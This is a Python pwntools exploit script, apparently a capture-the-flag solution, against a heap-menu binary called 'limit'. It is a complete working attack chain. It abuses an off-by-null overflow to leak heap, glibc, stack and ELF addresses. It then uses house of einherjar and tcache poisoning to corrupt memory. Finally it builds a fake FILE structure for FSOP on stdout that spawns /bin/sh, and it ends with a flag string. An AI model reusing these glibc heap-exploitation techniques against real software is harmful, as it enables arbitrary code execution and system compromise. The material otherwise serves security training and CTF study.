from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./limit_patched', '''
    b *(main+324)
    b *(main+673)
    b *(main+886)
    b *(main+1071)
    continue
''')

# p = remote('smiley.cat', 36505)

def malloc(index, size):
    p.sendlineafter(b"> ", b'1')
    p.sendlineafter(b"Index: ", str(index).encode())
    p.sendlineafter(b"Size: ", str(size).encode())

def free(index):
    p.sendlineafter(b"> ", b'2')
    p.sendlineafter(b"Index: ", str(index).encode())

def read(index):
    p.sendlineafter(b"> ", b'3')
    p.sendlineafter(b"Index: ", str(index).encode())
    p.recvuntil(b"Data: ")
    return p.recvuntil(b"\n\n", drop=True)

def write(index, data):
    p.sendlineafter(b"> ", b'4')
    p.sendlineafter(b"Index: ", str(index).encode())
    p.sendafter(b"Data: ", data)

# every chunk pointer in bss section is set to NULL once freed, whose size value in bss section is set to 0 as well
# only each malloced chunk with an address less than end of heap area is readable and writable
# there is no simple use-after-free vulnerability
# there is an off-by-null overflow when writing data to a chunk

glibc_e = ELF('./libc.so.6')

# Stage 1: leak heap base address and glibc base address
# allocate 8 chunks of size 0x100
for i in range(8):
    malloc(i, 0xf8)
# allocate another chunk of size 0x20 to avoid malloc consolidation
malloc(8, 0x18)
# free 8 chunks of size 0x100 to fill tcache bins with first 7 chunks and let last chunk be in unsorted bin
for i in range(8):
    free(i)
# allocate 7 chunks of size 0x100 to clear tcache bins
for i in range(7):
    malloc(i, 0xf8)
heap_base_addr = ((u64(read(6).ljust(8, b'\x00'))<<12)^0)&~0xfff
log.info(f"heap base address: {hex(heap_base_addr)}")
# allocate another chunk of size 0x20, which is splited from chunk of size 0x100 in unsorted bin
malloc(7, 0x18)
glibc_base_addr = (u64(read(7).ljust(8, b'\x00'))&~0xfff)-0x203000
log.info(f"glibc base address: {hex(glibc_base_addr)}")
# allocate another chunk of size 0xe0 to clear unsorted bin
malloc(8, 0xd8)

# Stage 2: house of einherjar for tcache poisoning to leak stack argv address in post tcache poisoning stage
malloc(0, 0x28)
malloc(1, 0x28)
malloc(2, 0x28)
malloc(3, 0x28)
malloc(4, 0xf8)
# prepare fake chunk of size 0xb0 at heap_base_addr+0xad0 for house of einherjar in chunk at heap_base_addr+0xac0
write(0, p64(0)+p64(0xb0)+p64(heap_base_addr+0xac0)*2)
# overwrite prev_size and size of chunk at heap_base_addr+0xc80 with 0xb0 (fake chunk size) and 0x100 (off-by-null overflow set prev_inuse to 0) respectively to pass check of house of einherjar
write(3, p64(0)*4+p64(0xb0))
# allocate 7 chunks of size 0x100
for i in range(5, 12):
    malloc(i, 0xf8)
# free 7 chunks of size 0x100 to fill tcache bins
for i in range(5, 12):
    free(i)
# free chunk at heap_base_addr+0xc80 to trigger house of einherjar, a chunk of size 0x1b0 (0xb0+0x100) starting from fake chunk at heap_base_addr+0xad0 is freed into unsorted bin
free(4)
# prepare for tcache poisoning
free(2)
free(1)
# allocate a chunk of size 0xb0 starting from heap_base_addr+0xad0 to realize writable for freed chunk in tcache bins
malloc(12, 0xa8)
# tcache bins with size 0x30: heap_base_addr+0xaf0 <- glibc_base_addr+glibc_e.symbols['__libc_argv'] <- [*(glibc_base_addr+glibc_e.symbols['__libc_argv'])]^((glibc_base_addr+glibc_e.symbols['__libc_argv'])>>12)
write(12, p64(0)*3+p64(0x31)+p64(((heap_base_addr+0xaf0)>>12)^(glibc_base_addr+glibc_e.symbols['__libc_argv'])))
# perform tcache poisoning
malloc(13, 0x28)
malloc(14, 0x28)
# tcache bins with size 0x30: heap_base_addr+0xb50 <- [*(glibc_base_addr+glibc_e.symbols['__libc_argv'])]^((glibc_base_addr+glibc_e.symbols['__libc_argv'])>>12)
free(3)
malloc(15, 0x28)
stack_argv_addr = u64(read(15).ljust(8, b'\x00'))^((heap_base_addr+0xb50)>>12)^((glibc_base_addr+glibc_e.symbols['__libc_argv'])>>12)
log.info(f"stack argv address: {hex(stack_argv_addr)}")
# allocate 8 chunks of size 0xf8 to clear tcache bins
for i in range(8):
    malloc(i, 0xf8)

# Stage 3: house of einherjar for tcache poisoning to leak elf base address in post tcache poisoning stage
malloc(0, 0x28)
malloc(1, 0x28)
malloc(2, 0x28)
malloc(3, 0x28)
malloc(4, 0xf8)
# prepare fake chunk of size 0xb0 at heap_base_addr+0x1390 for house of einherjar in chunk at heap_base_addr+0x1380
write(0, p64(0)+p64(0xb0)+p64(heap_base_addr+0x1380)*2)
# overwrite prev_size and size of chunk at heap_base_addr+0x1540 with 0xb0 (fake chunk size) and 0x100 (off-by-null overflow set prev_inuse to 0) respectively to pass check of house of einherjar
write(3, p64(0)*4+p64(0xb0))
# allocate 7 chunks of size 0x100
for i in range(5, 12):
    malloc(i, 0xf8)
# free 7 chunks of size 0x100 to fill tcache bins
for i in range(5, 12):
    free(i)
# free chunk at heap_base_addr+0x1540 to trigger house of einherjar, a chunk of size 0x1b0 (0xb0+0x100) starting from fake chunk at heap_base_addr+0x1390 is freed into unsorted bin
free(4)
# prepare for tcache poisoning
free(2)
free(1)
# allocate a chunk of size 0xb0 starting from heap_base_addr+0x1390 to realize writable for freed chunk in tcache bins
malloc(12, 0xa8)
# tcache bins with size 0x30: heap_base_addr+0x13b0 <- stack_argv_addr-0x48 <- [*(stack_argv_addr-0x48)]^((stack_argv_addr-0x48)>>12)
write(12, p64(0)*3+p64(0x31)+p64(((heap_base_addr+0x13b0)>>12)^(stack_argv_addr-0x48)))
# perform tcache poisoning
malloc(13, 0x28)
malloc(14, 0x28)
# tcache bins with size 0x30: heap_base_addr+0x1410 <- [*(stack_argv_addr-0x48)]^((stack_argv_addr-0x48)>>12)
free(3)
malloc(15, 0x28)
elf_base_addr = (u64(read(15).ljust(8, b'\x00'))^((heap_base_addr+0x1410)>>12)^((stack_argv_addr-0x48)>>12))-0x1160
log.info(f"elf base address: {hex(elf_base_addr)}")
# allocate 8 chunks of size 0xf8 to clear tcache bins
for i in range(8):
    malloc(i, 0xf8)

# Stage 4: house of einherjar for tcache poisoning to trigger FSOP
malloc(0, 0x28)
malloc(1, 0xe8)
malloc(2, 0xe8)
malloc(3, 0xf8)
# prepare fake chunk of size 0x200 at heap_base_addr+0x1c50 for house of einherjar in chunk at heap_base_addr+0x1c40
write(0, p64(0)+p64(0x200)+p64(heap_base_addr+0x1c40)*2)
# overwrite prev_size and size of chunk at heap_base_addr+0x1f50 with 0x200 (fake chunk size) and 0x100 (off-by-null overflow set prev_inuse to 0) respectively to pass check of house of einherjar
write(2, p64(0)*0x1c+p64(0x200))
# allocate 7 chunks of size 0x100
for i in range(4, 11):
    malloc(i, 0xf8)
# free 7 chunks of size 0x100 to fill tcache bins
for i in range(4, 11):
    free(i)
# free chunk at heap_base_addr+0x1f50 to trigger house of einherjar, a chunk of size 0x300 (0x200+0x100) starting from fake chunk at heap_base_addr+0x1c50 is freed into unsorted bin
free(3)
# prepare for tcache poisoning
free(2)
free(1)
# allocate a chunk of size 0x40 starting from heap_base_addr+0x1c50 to realize writable for freed chunk in tcache bins
malloc(11, 0x38)
# tcache bins with size 0xf0: heap_base_addr+0x1c70 <- elf_base_addr+0x40b0 (chunks[14])
write(11, p64(0)*3+p64(0xf1)+p64(((heap_base_addr+0x1c70)>>12)^(elf_base_addr+0x40b0)))
# perform tcache poisoning
malloc(12, 0xe8)
malloc(13, 0xe8)
# overwrite chunks[14] with glibc stdout address and sizes[14] with 0xff max
write(13, p64(glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_'])+p64(0)*4+p64(0x00ff00000000))
# trigger FSOP by exploiting chunks[14]
fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end = glibc_base_addr+glibc_e.sym.system
fake._IO_write_end = u64(b'/bin/sh\x00')
fake._IO_save_base = glibc_base_addr+next(glibc_e.search(asm('add rdi, 0x10; jmp rcx;')))
fake._lock = glibc_base_addr+glibc_e.symbols['_IO_stdfile_1_lock']
fake._codecvt = glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0xb8
fake._wide_data = glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0x200
fake.unknown2 = p64(0)*2+p64(glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0x20)+p64(0)*3+p64(glibc_base_addr+glibc_e.symbols['_IO_wfile_jumps']-0x18)
write(14, bytes(fake))

p.interactive()

# .;,;.{1_am_4_f1ag_gr3nad3_I_am_a_f14g_gren4d3_I_4m_4_fl4g_gr3nade_aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9wL0RJZUg3alRwaXdNLw==}